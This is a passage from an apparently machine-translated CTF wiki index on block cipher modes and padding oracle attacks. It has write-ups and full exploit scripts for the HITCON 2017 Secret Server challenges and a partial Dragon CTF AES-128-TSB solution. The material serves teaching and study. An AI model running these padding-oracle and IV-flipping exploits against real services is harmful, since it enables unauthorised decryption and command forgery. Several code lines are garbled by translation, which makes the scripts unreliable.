one is obviously padding when it is encrypted.</p>"},{"location":"crypto/blockcipher/mode/ecb/#topic","title":"topic","text":"<ul> <li>2018 PlaidCTF macsh</li> </ul>"},{"location":"crypto/blockcipher/mode/introduction/","title":"\u7ec4\u6a21\u5f0f","text":"<p>Packet encryption divides the plaintext message into fixed-size blocks, and each block of plaintext is encrypted into ciphertext under key control. Of course not every message is an integer multiple of the corresponding block size, so we may need to do the padding.</p>"},{"location":"crypto/blockcipher/mode/ofb/","title":"OFB","text":"<p>OFB is called output feedback mode, and its feedback content is packet-encrypted content instead of ciphertext.</p>"},{"location":"crypto/blockcipher/mode/ofb/#encryption","title":"Encryption","text":""},{"location":"crypto/blockcipher/mode/ofb/#decryption","title":"decryption","text":""},{"location":"crypto/blockcipher/mode/ofb/#advantages-and-disadvantages","title":"Advantages and disadvantages","text":""},{"location":"crypto/blockcipher/mode/ofb/#advantages","title":"Advantages","text":"<ol> <li>Does not have error propagation characteristics.</li> </ol>"},{"location":"crypto/blockcipher/mode/ofb/#disadvantages","title":"Disadvantages","text":"<ol> <li>IV does not require confidentiality, but a different IV must be chosen for each message.</li> <li>Does not have self-synchronization capability.</li> </ol>"},{"location":"crypto/blockcipher/mode/ofb/#applicable-scene","title":"Applicable scene","text":"<p>Applicable to some scenarios where the plaintext redundancy is relatively large, such as image encryption and voice encryption.</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/","title":"Padding Oracle Attack","text":""},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#introduction","title":"Introduction","text":"<p>Padding Oracle Attack attacks generally need to meet the following conditions</p> <ul> <li>Encryption Algorithm</li> <li>Encryption algorithm using PKCS5 Padding. Of course, the way OAEP is filled in asymmetric encryption may also be affected.</li> <li>The grouping mode is CBC mode.</li> <li>Attacker ability</li> <li>An attacker can intercept messages encrypted by the above encryption algorithm.</li> <li>The attacker can interact with the padding oracle (the server): the client sends the ciphertext to the server, and the server will use some kind of return information to inform the client whether the padding is normal.</li> </ul> <p>Padding Oracle Attack can achieve the following effects</p> <ul> <li>Decrypt any given ciphertext without knowing the key and IV.</li> </ul>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#principle","title":"Principle","text":"<p>The basic principles of the Padding Oracle Attack attack are as follows</p> <ul> <li>Decrypt a very long message piece by piece.</li> <li>For each message, first decrypt the last byte of the message, then decrypt the second to last byte, and so on.</li> </ul> <p>Here we review the CBC</p> <ul> <li>Encryption</li> </ul> <p>$$</p> <p>C_i=E_K(P_i \\oplus C_{i-1})\\</p> <p>IV = C_0 $$</p> <ul> <li>Decryption</li> </ul> <p>$$</p> <p>P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\ C_{0}=IV</p> <p>$$</p> <p>We mainly focus on decryption, we don't know IV and key here. Here we assume that the length of the ciphertext block is n bytes.</p> <p>Suppose we intercepted ciphertext Y to obtain the last byte of ciphertext Y as an example for analysis. In order to obtain the content of Y, we first need to forge a piece of ciphertext F so that the last byte of the plaintext corresponding to Y can be modified. This is because if we construct the ciphertext <code>F|Y</code>, then the decryption Y is specifically $$</p> <p>P = D_K (Y)  oplus F $$</p> <p>So modify the last byte of ciphertext F, F_{n}, to modify the last byte of the plaintext corresponding to Y. The process of getting the last byte of P is given below.</p> <ol> <li>i=0, set each byte of F to be random byte.</li> <li>Set F_n=i \\oplus 0x01</li> <li>Send F|Y to the server. If the last byte of P is i, then the last padding is 0x01 and no error will occur. Otherwise, only the last P_n \\oplus i \\oplus 0x01 bytes of P are P_n \\oplus i \\oplus 0x01 and no error will be reported. ** Also, note that the padding bytes can only be 0 to n. ** Therefore, if you want to make the error in the case of F randomly and satisfy the padding byte size, the probability is small**. So in the case of no error on the server side, we can think that we did get the correct bytes.</li> <li>In the event of an error, i=i+1, jump to 2.</li> </ol> <p>After getting the last byte of P, we can continue to get the second-to-last byte of P. In this case, we need to set F_n=P_n\\oplus 0x02 and set F_{n-1}=i \\oplus 0x02 to enumerate i.</p> <p>So, in summary, Padding Oracle Attack is actually a method of attack with a high probability of success.</p> <p>However, it's important to note that some of the real-world problems that are often encountered are not the standard Padding Oracle Attack mode, and we often need to make some changes.</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#2017-hitcon-secret-server","title":"2017 HITCON Secret Server","text":""},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#analysis","title":"Analysis","text":"<p>The encryption used in the program is AES CBC, which uses padding similar to PKCS5.</p> <pre><code>def pad(msg):\n\n    pad_length = 16-len(msg)%16\n\n    return msg+chr(pad_length)*pad_length\n\n\n\ndef unpad (msg):\n    return msg[:-ord(msg[-1])]\n</code></pre> <p>However, in each unpad, no detection is performed, but the unpad is directly executed.</p> <p>Among them, it should be noted that the function that interacts with the user each time is</p> <ul> <li><code>send_msg</code> , accepts the user's plaintext, encrypts it with a fixed <code>2jpmLoSsOlQrqyqE</code>, and outputs the encrypted result.</li> <li><code>recv_msg</code> , accepts the user's IV and ciphertext, decrypts the ciphertext, and returns. There will be different actions depending on the results returned.</li> </ul> <pre><code>            msg = recv_msg().strip()\n\n            if msg.startswith('exit-here'):\n\n                exit(0)\n\n            elif msg.startswith('get-flag'):\n\n                send_msg(flag)\n\n            elif msg.startswith('get-md5'):\n\n                send_msg(MD5.new(msg[7:]).digest())\n\n            elif msg.startswith('get-time'):\n\n                send_msg(str(time.time()))\n\n            elif msg.startswith('get-sha1'):\n\n                send_msg(SHA.new(msg[8:]).digest())\n\n            elif msg.startswith('get-sha256'):\n\n                send_msg(SHA256.new(msg[10:]).digest())\n\n            elif msg.startswith('get-hmac'):\n\n                send_msg(HMAC.new(msg[8:]).digest())\n\n            else:\n\n                send_msg('command not found')\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#main-vulnerabilities","title":"Main Vulnerabilities","text":"<p>Here we briefly summarize the parts we have.</p> <ul> <li>Encryption</li> <li>The IV when encrypting is fixed and known.</li> <li>'Welcome!!' Encrypted result.</li> <li>Decryption</li> <li>We can control IV.</li> </ul> <p>First of all, since we know the result of the <code>Welcome!!</code> encryption, we can also control the IV in recv_msg, then according to the decryption process $$</p> <p>P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\ C_{0}=IV</p> <p>$$</p> <p>If we enter the encrypted result of <code>Welcome!!</code> into recv_msg, the result of direct decryption is <code>(Welcome!!+&amp;#39;\\x07&amp;#39;*7) xor iv</code>, if we ** properly control the decryption process In the iv passed, then we can control the decrypted result. In other words, we can execute any of the commands described above. Thus, we can also know the result of the <code>flag</code> decryption.</p> <p>Secondly, on the above basis, if we add the custom IV and Welcome encrypted result after any ciphertext C and pass it to recv_msg as input, then we can control the last byte of the message after decryption. So due to the unpad operation, we can control the length of the decrypted message to be reduced from 0 to 255.</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#using-ideas","title":"Using ideas","text":"<p>Basic use ideas are as follows</p> <p>Bypass proof of work 2. Obtain the encrypted flag according to the way you execute any command. 3. Since the beginning of the flag is <code>hitcon{</code>, there are 7 bytes in total, so we can still control the iv to make the first 7 bytes after decryption the specified byte. This allows us to execute the <code>get-md5</code> command on the decrypted message. According to the unpad operation, we can control the decrypted message exactly at the first few bytes of the message. So we can start controlling the decrypted message as <code>hitcon{x</code>, that is, only one byte after <code>hitcon{</code>. This will result in an encrypted result with a one-byte hash. Similarly, we can also get the result of the encryption with a byte hash. 4. In this case, we can blast locally byte by byte, calculate the corresponding <code>md5</code>, and then use the arbitrary command execution mode to control the decrypted plaintext to any specified command. If the control is unsuccessful, it means that the byte is incorrect. , need to blast again; if it is correct, then you can directly execute the corresponding command.</p> <p>The specific code is as follows</p> <pre><code>#coding=utf-8\n\nfrom pwn import *\n\nimport base64, time, random, string\n\nfrom Crypto.Cipher import AES\n\nfrom Crypto.Hash import SHA256, MD5\n\n#context.log_level = 'debug'\n\nif args['REMOTE']:\n\n    p = remote('52.193.157.19', 9999)\n\nelse:\n\n    p = remote('127.0.0.1', 7777)\n\n\n\n\n\ndef strxor(str1, str2):\n\n    return ''.join([chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2)])\n\n\n\n\n\ndef pad(msg):\n\n    pad_length = 16 - len(msg) % 16\n\n    return msg + chr(pad_length) * pad_length\n\n\n\n\n\ndef unpad (msg):\nReturn msg[:-ord(msg[-1])] # Remove the pad\n\n\n\n\ndef flipplain(oldplain, newplain, iv):\n\n    \"\"\"flip oldplain to new plain, return proper iv\"\"\"\n\n    return strxor(strxor(oldplain, newplain), iv)\n\n\n\n\n\ndef bypassproof():\n\n    p.recvuntil('SHA256(XXXX+')\n\n    lastdata = p.recvuntil(')', drop=True)\n\n    p.recvuntil(' == ')\n\n    digest = p.recvuntil('\\nGive me XXXX:', drop=True)\n\n\n\n    def proof(s):\n\n        return SHA256.new(s + lastdata).hexdigest() == digest\n\n\n\ndata = pwnlib.util.iters.mbruteforce (\n        proof, string.ascii_letters + string.digits, 4, method='fixed')\n\n    p.sendline(data)\n\n    p.recvuntil('Done!\\n')\n\n\n\n\n\niv_encrypt = '2jpmLoSsOlQrqyqE'\n\n\n\n\n\ndef getmd5enc(i, cipher_flag, cipher_welcome):\n\n    \"\"\"return encrypt( md5( flag[7:7+i] ) )\"\"\"\n\n    ## keep iv[7:] do not change, so decrypt won't change\n\nnew_iv = flipplain (&amp;quot;hitcon {&amp;quot;. bright (16, &amp;quot;x00&amp;quot;), &amp;quot;get-md5&amp;quot; .light (\n        16, '\\x00'), iv_encrypt)\n\n    payload = new_iv + cipher_flag\n\n    ## calculate the proper last byte number\n\n    last_byte_iv = flipplain(\n\n        pad(\"Welcome!!\"),\n\n        \"a\" * 15 + chr(len(cipher_flag) + 16 + 16 - (7 + i + 1)), iv_encrypt)\n\n    payload += last_byte_iv + cipher_welcome\n\n    p.sendline(base64.b64encode(payload))\n\n    return p.recvuntil(\"\\n\", drop=True)\n\n\n\n\n\ndef main():\n\n    bypassproof()\n\n\n\n    # result of encrypted Welcome!!\n\n    cipher = p.recvuntil('\\n', drop=True)\n\n    cipher_welcome = base64.b64decode(cipher)[16:]\n\n    log.info(\"cipher welcome is : \" + cipher_welcome)\n\n\n\n    # execute get-flag\n\n    get_flag_iv = flipplain(pad(\"Welcome!!\"), pad(\"get-flag\"), iv_encrypt)\n\n    payload = base64.b64encode(get_flag_iv + cipher_welcome)\n\n    p.sendline(payload)\n\n    cipher = p.recvuntil('\\n', drop=True)\n\n    cipher_flag = base64.b64decode(cipher)[16:]\n\n    flaglen = len(cipher_flag)\n\n    log.info(\"cipher flag is : \" + cipher_flag)\n\n\n\n    # get command not found cipher\n\n    p.sendline(base64.b64encode(iv_encrypt + cipher_welcome))\n\n    cipher_notfound = p.recvuntil('\\n', drop=True)\n\n\n\n    flag = \"\"\n\n    # brute force for every byte of flag\n\n    for i in range(flaglen - 7):\n\n        md5_indexi = getmd5enc(i, cipher_flag, cipher_welcome)\n\nmd5_indexi = base64.b64decode (md5_indexi) [16:]\n        log.info(\"get encrypt(md5(flag[7:7+i])): \" + md5_indexi)\n\n        for guess in range(256):\n\n            # locally compute md5 hash\n\n            guess_md5 = MD5.new(flag + chr(guess)).digest()\n\n            # try to null out the md5 plaintext and execute a command\n\n            payload = flipplain(guess_md5, 'get-time'.ljust(16, '\\x01'),\n\n                                iv_encrypt)\n\n            payload += md5_indexi\n\n            p.sendline(base64.b64encode(payload))\n\n            res = p.recvuntil(\"\\n\", drop=True)\n\n            # if we receive the block for 'command not found', the hash was wrong\n\n            if res == cipher_notfound:\n\n                print 'Guess {} is wrong.'.format(guess)\n\n            # otherwise we correctly guessed the hash and the command was executed\n\n            else:\n\n                print 'Found!'\n\n                flag += chr(guess)\n\n                print 'Flag so far:', flag\n\n                break\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    main()\n</code></pre> <p>The final result is as follows</p> <pre><code>Flag so far: Paddin9_15_ve3y_h4rd__!!}\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#2017-hitcon-secret-server-revenge","title":"2017 HITCON Secret Server Revenge","text":""},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#description","title":"Description","text":"<pre><code>The password of zip is the flag of \"Secret Server\"\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#analysis_1","title":"Analysis","text":"<p>This program continues with the above program, but this time a simple modification</p> <ul> <li>The iv of the encryption algorithm is unknown, but can be derived from the message encrypted by Welcome.</li> <li>The program has a 56-byte token.</li> <li>The program can perform up to 340 operations, so the above blasting is naturally not feasible</li> </ul> <p>The general process of the program is as follows</p> <p>After proof of work 2. Send \"Welcome!!\" encrypted message 3. In 340 operations, you need to guess the value of the token and then automatically output the flag.</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#vulnerability","title":"Vulnerability","text":"<p>Of course, the loopholes in the previous topic still exist in this topic, namely</p> <ol> <li>Execute the given command arbitrarily</li> <li>Length truncation</li> </ol>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#using-ideas_1","title":"Using ideas","text":"<p>Due to the limitation of the number of 340, although we can still get the value of <code>md5(token[:i])</code> encrypted ( here we need to pay attention to this part of the encryption is exactly 32 bytes, the first 16 bytes are The value after md5 is encrypted, the next 16 bytes are completely filled with encrypted bytes. Here <code>md5(token[:i])</code> refers specifically to the first 16 bytes.). However, we can't blast 256 times again in order to get a character.</p> <p>Since it is not possible to blast, is it possible to get the size of one byte at a time? Here, let's take a look at the information that the program may leak.</p> <ol> <li>The encrypted value of the md5 value of some messages. Here we can get the encrypted value of <code>md5(token[:i])</code>.</li> <li>Unpad will unmap the decrypted message each time. This byte is determined based on the last byte of the decrypted message. If we can calculate the size of this byte, then we may know the value of a byte.</li> </ol> <p>Here we delve into the information leak of unpad. If we put the encryption IV and <code>encrypt(md5(token[:i]))</code> after a ciphertext C to form <code>C|IV|encrypt(md5(token[:i]))</code>, then decrypt The last plaintext block of the outgoing message is <code>md5(token[:i])</code>. Furthermore, in the unpad, the last byte (0-255) of <code>md5(token[:i])</code> is used for unpad, and then the specified command (such as md5) is executed on the string after the unpad. Then, if we ** pre-configure some hashed samples after the message hash, and then compare the results of the above execution with the sample, if they are the same, then we can basically determine the <code>md5(token[:i])</code> * * Last byte**. However, if the last byte of <code>md5(token[:i])</code> is less than 16, then some values in md5 will be used in unpad, and this part of the value, due to <code>token[:i] for different lengths</code> Almost all will not be the same. So special handling may be required.</p> <p>We already know the key to this problem, which is to generate a sample of the encrypted result corresponding to the size of the unpad byte, in order to facilitate the lookup table.</p> <p>The specific use ideas are as follows</p> <ol> <li>Bypass proof of work.</li> <li>Get the token encrypted result <code>token_enc</code> , which will add 7 bytes <code>&amp;quot;token: &amp;quot;</code> in front of the token. Therefore, the length after encryption is 64.</li> <li>Get the result of <code>encrypt(md5(token[:i]))</code>, which is a total of 57, including the padding of the last token.</li> <li>Construct a sample that corresponds to the size of the unpad. Here we construct the ciphertext <code>token_enc|padding|IV_indexi|welcome_enc</code>. Since <code>IV_indexi</code> is to modify the last byte of the last plaintext block, the byte is in the process of being changed. If we want to get some fixed byte hashes, this part can't be added naturally. Therefore, the size of the unpad ranges from 17 to 255 when the sample is generated here. If the last byte of <code>md5(token[:i])</code> is less than 17 at the end of the test, there will be some unknown samples. A natural idea is that we directly get 255-17+1 such multiple samples, however, if we do this, according to the number of times above 340 (255-17+1+57+56&gt;340), we obviously can't Get all the bytes to the token. So here we need to find ways to reuse some content, here we choose to reuse the result of <code>encrypt(md5(token[:i]))</code>. Then we need to ensure that the number of times is sufficient on the one hand, and on the other hand, the previous results can be reused. Here we set the unpad loop to 17 to 208, and make the unpad more than 208 when we just unpad to where we can reuse. It should be noted here that when the last byte of <code>md5(token[:i])</code> is 0, all decrypted plaintext unpad will be dropped, so the ciphertext of command not found will appear.</li> <li>Construct the ciphertext <code>token_enc|padding|IV|encrypt(md5(token[:i]))</code> again, then use the last byte of <code>md5(token[:i])</code> for unpad when decrypting. If this byte is not less than 17 or 0, it can be processed. If this byte is less than 17, then obviously, the result of the last md5 returned to the user is not within the sample range, then we modify the highest bit of its last byte so that it can fall within the sample range after the unpad. In this way, we can guess the last byte of <code>md5(token[:i])</code>.</li> <li>After guessing the last byte of <code>md5(token[:i])</code>, we can brute 256 times locally and find out that all hashes are at the end of <code>md5(token[:i])</code> The last byte of the character.</li> <li>However, in the sixth step, for a <code>md5(token[:i])</code> we may find multiple alternative characters because we only need to make the last byte of the given byte.</li> <li>So, the question is, how do you delete some extra candidate strings? Here I chose a small trick, which enumerates the padding of the token at the same time as the byte-by-byte enumeration. Since padding is fixed at 0x01, we only need to filter out all tokens that are not 0x01 at the end.</li> </ol> <p>Here, the <code>sleep</code> in the code is commented out during the test. In order to speed up the interaction. Use the code as follows</p> <pre><code>from pwn import *\n\nimport base64, time, random, string\n\nfrom Crypto.Cipher import AES\n\nfrom Crypto.Hash import SHA256, MD5\n\n#context.log_level = 'debug'\n\n\n\np = remote('127.0.0.1', 7777)\n\n\n\n\n\ndef strxor(str1, str2):\n\n    return ''.join([chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2)])\n\n\n\n\n\ndef pad(msg):\n\n    pad_length = 16 - len(msg) % 16\n\n    return msg + chr(pad_length) * pad_length\n\n\n\n\n\ndef unpad (msg):\n    return msg[:-ord(msg[-1])]  # remove pad\n\n\n\n\n\ndef flipplain(oldplain, newplain, iv):\n\n    \"\"\"flip oldplain to new plain, return proper iv\"\"\"\n\n    return strxor(strxor(oldplain, newplain), iv)\n\n\n\n\n\ndef bypassproof():\n\n    p.recvuntil('SHA256(XXXX+')\n\n    lastdata = p.recvuntil(')', drop=True)\n\n    p.recvuntil(' == ')\n\n    digest = p.recvuntil('\\nGive me XXXX:', drop=True)\n\n\n\n    def proof(s):\n\n        return SHA256.new(s + lastdata).hexdigest() == digest\n\n\n\ndata = pwnlib.util.iters.mbruteforce (\n        proof, string.ascii_letters + string.digits, 4, method='fixed')\n\n    p.sendline(data)\n\n\n\n\n\ndef sendmsg(iv, cipher):\n\n    payload = iv + cipher\n\n    payload = base64.b64encode(payload)\n\n    p.sendline(payload)\n\n\n\n\n\ndef recvmsg():\n\n    data = p.recvuntil(\"\\n\", drop=True)\n\n    data = base64.b64decode(data)\n\n    return data[:16], data[16:]\n\n\n\n\n\ndef getmd5enc(i, cipher_token, cipher_welcome, iv):\n\n    \"\"\"return encrypt( md5( token[:i+1] ) )\"\"\"\n\n    ## keep iv[7:] do not change, so decrypt msg[7:] won't change\n\nget_md5_iv = flipplain (&amp;quot;token:&amp;quot; .lit (16, &amp;quot;x00&amp;quot;), &amp;quot;get-md5&amp;quot;.\n        16, '\\x00'), iv)\n\n    payload = cipher_token\n\n    ## calculate the proper last byte number\n\n    last_byte_iv = flipplain(\n\n        pad(\"Welcome!!\"),\n\n        \"a\" * 15 + chr(len(cipher_token) + 16 + 16 - (7 + i + 1)), iv)\n\n    payload += last_byte_iv + cipher_welcome\n\n    sendmsg(get_md5_iv, payload)\n\n    return recvmsg()\n\n\n\n\n\ndef get_md5_token_indexi(iv_encrypt, cipher_welcome, cipher_token):\n\n    md5_token_idxi = []\n\n    for i in range(len(cipher_token) - 7):\n\n        log.info(\"idx i: {}\".format(i))\n\n        _, md5_indexi = getmd5enc(i, cipher_token, cipher_welcome, iv_encrypt)\n\nassert (only (md5_indexi) == 32)        # remove the last 16 byte for padding\n\n        md5_token_idxi.append(md5_indexi[:16])\n\n    return md5_token_idxi\n\n\n\n\n\ndef doin(unpadcipher, md5map, candidates, flag):\n\n    if unpadcipher in md5map:\n\n        lastbyte = md5map[unpadcipher]\n\n    else:\n\n        lastbyte = 0\n\n    if flag == 0:\n\n        lastbyte ^= 0x80\n\n    newcandidates = []\n\n    for x in candidates:\n\n        for c in range(256):\n\n            if MD5.new(x + chr(c)).digest()[-1] == chr(lastbyte):\n\n                newcandidates.append(x + chr(c))\n\n    candidates = newcandidates\n\n    print candidates\n\n    return candidates\n\n\n\n\n\ndef main():\n\n    bypassproof()\n\n\n\n    # result of encrypted Welcome!!\n\n    iv_encrypt, cipher_welcome = recvmsg()\n\n    log.info(\"cipher welcome is : \" + cipher_welcome)\n\n\n\n    # execute get-token\n\n    get_token_iv = flipplain(pad(\"Welcome!!\"), pad(\"get-token\"), iv_encrypt)\n\n    sendmsg(get_token_iv, cipher_welcome)\n\n    _, cipher_token = recvmsg()\n\ntoken_len = only (cipher_token)\n    log.info(\"cipher token is : \" + cipher_token)\n\n\n\n    # get command not found cipher\n\n    sendmsg(iv_encrypt, cipher_welcome)\n\n    _, cipher_notfound = recvmsg()\n\n\n\n    # get encrypted(token[:i+1]),57 times\n\n    md5_token_idx_list = get_md5_token_indexi(iv_encrypt, cipher_welcome,\n\n                                              cipher_token)\n\n    # get md5map for each unpadsize, 209-17 times\n\n    # when upadsize&gt;208, it will unpad ciphertoken\n\n    # then we can reuse\n\nmd5map = dict ()\n    for unpadsize in range(17, 209):\n\n        log.info(\"get unpad size {} cipher\".format(unpadsize))\n\nget_md5_iv = flipplain (&amp;quot;token:&amp;quot; .lit (16, &amp;quot;x00&amp;quot;), &amp;quot;get-md5&amp;quot;.\n            16, '\\x00'), iv_encrypt)\n\n        ## padding 16*11 bytes\n\n        padding = 16 * 11 * \"a\"\n\n        ## calculate the proper last byte number, only change the last byte\n\n        ## set last_byte_iv = iv_encrypted[:15] | proper byte\n\n        last_byte_iv = flipplain(\n\n            pad(\"Welcome!!\"),\n\n            pad(\"Welcome!!\")[:15] + chr(unpadsize), iv_encrypt)\n\n        cipher = cipher_token + padding + last_byte_iv + cipher_welcome\n\n        sendmsg(get_md5_iv, cipher)\n\n        _, unpadcipher = recvmsg()\n\n        md5map[unpadcipher] = unpadsize\n\n\n\n    # reuse encrypted(token[:i+1])\n\n    for i in range(209, 256):\n\n        target = md5_token_idx_list[56 - (i - 209)]\n\n        md5map[target] = i\n\n\n\n    candidates = [\"\"]\n\n    # get the byte token[i], only 56 byte\n\n    for i in range(token_len - 7):\n\n        log.info(\"get token[{}]\".format(i))\n\nget_md5_iv = flipplain (&amp;quot;token:&amp;quot; .lit (16, &amp;quot;x00&amp;quot;), &amp;quot;get-md5&amp;quot;.\n            16, '\\x00'), iv_encrypt)\n\n        ## padding 16*11 bytes\n\n        padding = 16 * 11 * \"a\"\n\n        cipher = cipher_token + padding + iv_encrypt + md5_token_idx_list[i]\n\n        sendmsg(get_md5_iv, cipher)\n\n        _, unpadcipher = recvmsg()\n\n        # already in or md5[token[:i]][-1]='\\x00'\n\n        if unpadcipher in md5map or unpadcipher == cipher_notfound:\n\n            candidates = doin(unpadcipher, md5map, candidates, 1)\n\n        else:\n\nlog.info (&amp;quot;unpad size 1-16&amp;quot;)\n            # flip most significant bit of last byte to move it in a good range\n\n            cipher = cipher[:-17] + strxor(cipher[-17], '\\x80') + cipher[-16:]\n\n            sendmsg(get_md5_iv, cipher)\n\n            _, unpadcipher = recvmsg()\n\n            if unpadcipher in md5map or unpadcipher == cipher_notfound:\n\n                candidates = doin(unpadcipher, md5map, candidates, 0)\n\n            else:\n\n                log.info('oh my god,,,, it must be in...')\n\n                exit()\n\n    print len(candidates)\n\n    # padding 0x01\n\n    candidates = filter(lambda x: x[-1] == chr(0x01), candidates)\n\n    # only 56 bytes\n\n    candidates = [x[:-1] for x in candidates]\n\n    print len(candidates)\n\n    assert (len(candidates[0]) == 56)\n\n\n\n    # check-token\n\n    check_token_iv = flipplain(\n\n        pad(\"Welcome!!\"), pad(\"check-token\"), iv_encrypt)\n\n    sendmsg(check_token_iv, cipher_welcome)\n\n    p.recvuntil(\"Give me the token!\\n\")\n\n    p.sendline(base64.b64encode(candidates[0]))\n\n    print p.recv()\n\n\n\n    p.interactive()\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    main()\n</code></pre> <p>The effect is as follows</p> <pre><code>...\n\n79\n\n1\n\nhitcon {uNp @ d_M3th0D_i5_am4Z1n9!}\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#teaser-dragon-ctf-2018-aes-128-tsb","title":"Teaser Dragon CTF 2018 AES-128-TSB","text":"<p>This topic is still very interesting, the title is described as follows</p> <pre><code>Haven't you ever thought that GCM mode is overcomplicated and there must be a simpler way to achieve Authenticated Encryption? Here it is!\n\n\n\nServer: aes-128-tsb.hackable.software 1337\n\n\n\nserver.py\n</code></pre> <p>The attachment and the final exp are found by the ctf-challenge repository.</p> <p>The basic process of the topic is</p> <ul> <li>Continuously receive two strings a and b, where a is plaintext and b is ciphertext, note</li> <li>b needs to satisfy the tail just equal to iv after decryption.</li> <li>if a and b are equal, then</li> <li>a is <code>gimme_flag</code> and the encrypted flag is output.</li> <li>Otherwise, output a string of randomly encrypted strings.</li> <li>Otherwise output a string of plain text.</li> </ul> <p>In addition, we can also find that there is a problem with the unpad in the title, and the specified length can be truncated.</p> <pre><code>def unpad (msg):\n    if not msg:\n\n        return ''\n\n    return msg[:-ord(msg[-1])]\n</code></pre> <p>In the beginning, the very straightforward idea is to enter 0 for the lengths of a and b, then you can bypass the <code>a==b</code> check to get a string of random ciphertext encrypted strings. However, it does not seem to have any effect, let's analyze the encryption process.</p> <pre><code>def tsb_encrypt(aes, msg):\n\n    msg = pad(msg)\n\n    iv = get_random_bytes(16)\n\nprev_pt = iv\n    prev_ct = iv\n\n    ct = ''\n\n    for block in split_by(msg, 16) + [iv]:\n\n        ct_block = xor(block, prev_pt)\n\n        ct_block = aes.encrypt(ct_block)\n\n        ct_block = xor(ct_block, prev_ct)\n\n        ct += ct_block\n\n        prev_pt = block\n\n        prev_ct = ct_block\n\n    return iv + ct\n</code></pre> <p>Let's assume that P_0=iv, C_0=iv, then</p> <p>C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i)</p> <p>So, assuming the message length is 16, similar to the length of the <code>gimme_flag</code> padding we want to get, then</p> <p>$ C_1 = IV  oplus E (IV  oplus P_1) $</p> <p>C_2=C_1 \\oplus E(P_1 \\oplus IV)</p> <p>It is easy to find C_2=IV.</p> <p>([Pirates] (https://github.com/pberba/ctf-solutions/tree/master/20180929_teaser_dragon/aes_128_tsb), the picture below is clearer</p> <p></p> <p>Conversely, if we send <code>iv+c+iv</code> to the server, we can always bypass the <code>tsb_decrypt</code> mac check.</p> <pre><code>def tsb_decrypt(aes, msg):\n\n    iv, msg = msg[:16], msg[16:]\n\nprev_pt = iv\n    prev_ct = iv\n\npt = &amp;#39;&amp;#39;\n    for block in split_by(msg, 16):\n\n        pt_block = xor(block, prev_ct)\n\n        pt_block = aes.decrypt(pt_block)\n\n        pt_block = xor(pt_block, prev_pt)\n\n        pt += pt_block\n\n        prev_pt = pt_block\n\n        prev_ct = block\n\npt, mac = pt [: - 16], pt [-16:]\n    if mac != iv:\n\n        raise CryptoError()\n\nreturn unpad (pt)\n</code></pre> <p>Then at this point, the message decrypted by the server is</p> <p>$ unpad (IV  oplus D (C_1  oplus IV)) $</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#get-the-last-byte-of-the-plaintext","title":"Get the last byte of the plaintext","text":"<p>We can consider controlling the D decrypted message as a constant value, such as all zeros, ie <code>C1=IV</code>, then we can enumerate the last byte of the IV from 0 to 255, get $IV \\oplus D(C_1 \\oplus IV) The last byte of $ is also 0~255. Only when it is 1~15, after the <code>unpad</code> operation, the message length is not 0. Therefore, we can count which numbers cause the length to be non-zero and enumerate as 1 and the remaining flags to 0.</p> <pre><code>def getlast_byte(iv, block):\n\niv_pre = iv [: 15]\niv_last = words (iv [-1])\n    tmp = []\n\n    print('get last byte')\n\n    for i in range(256):\n\n        send_data('')\n\niv = iv_pre + chr (i)\n        tmpblock = block[:15] + chr(i ^ ord(block[-1]) ^ iv_last)\n\n        payload = iv + tmpblock + iv\n\n        send_data(payload)\n\n        length, data = recv_data()\n\n        if 'Looks' in data:\n\n            tmp.append(1)\n\n        else:\n\n            tmp.append(0)\n\n    last_bytes = []\n\n    for i in range(256):\n\n        if tmp == xor_byte_map[i][0]:\n\n            last_bytes.append(xor_byte_map[i][1])\n\n    print('possible last byte is ' + str(last_bytes))\n\n    return last_bytes\n</code></pre> <p>In addition, we can get all the possible cases of the last byte at the beginning of the table, recorded in xor_byte_map.</p> <pre><code>\"\"\"\n\nevery item is a pair [a,b]\n\na is the xor list\n\nb is the idx which is zero when xored\n\n\"\"\"\nxor_byte_map = []\n\nfor i in range(256):\n\n    a = []\n\n    b = 0\n\n    for j in range(256):\n\n        tmp = i ^ j\n\n        if tmp &gt; 0 and tmp &lt;= 15:\n\n            a.append(1)\n\n        else:\n\n            a.append(0)\n\n        if tmp == 0:\n\n            b = j\n\n    xor_byte_map.append([a, b])\n</code></pre> <p>By comparing this table, we can know what is possible with the last byte.</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#decrypt-any-encrypted-block","title":"Decrypt any encrypted block","text":"<p>After obtaining the last byte of the plaintext, we can use the unpad vulnerability to get the corresponding plaintext content from length 1 to length 15.</p> <pre><code>def dec_block(iv, block):\n\n    last_bytes = getlast_byte(iv, block)\n\n\n\niv_pre = iv [: 15]\niv_last = words (iv [-1])\n    print('try to get plain')\n\nplain0 = &amp;#39;&amp;#39;\n    for last_byte in last_bytes:\n\nplain0 = &amp;#39;&amp;#39;\n        for i in range(15):\n\n            print 'idx:', i\n\ntag = false\n            for j in range(256):\n\n                send_data(plain0 + chr(j))\n\n                pad_size = 15 - i\n\n                iv = iv_pre + chr(pad_size ^ last_byte)\n\n                tmpblock = block[:15] + chr(\n\n                    pad_size ^ last_byte ^ ord(block[-1]) ^ iv_last\n\n                )\n\n                payload = iv + tmpblock 